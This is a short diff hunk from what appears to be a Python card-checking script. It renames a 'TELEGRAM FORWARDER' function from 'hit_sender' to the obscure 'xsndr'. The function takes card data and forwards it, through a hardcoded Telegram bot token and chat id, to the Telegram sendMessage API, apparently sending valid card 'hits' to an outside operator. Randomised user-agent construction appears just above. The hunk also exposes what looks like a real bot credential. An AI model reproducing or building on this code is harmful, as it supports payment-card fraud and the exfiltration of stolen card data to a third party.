@@ -641,7 +641,7 @@ for xd in range(1):
     gxdsUArndm = gxdsUA3 + gxdsUA4 + gxdsUA1
 
 # TELEGRAM FORWARDER
-def hit_sender(card,message,chat_id):
+def xsndr(card,message,chat_id):
     bot_token = '6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8'
     chat_id = "6542321044"
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
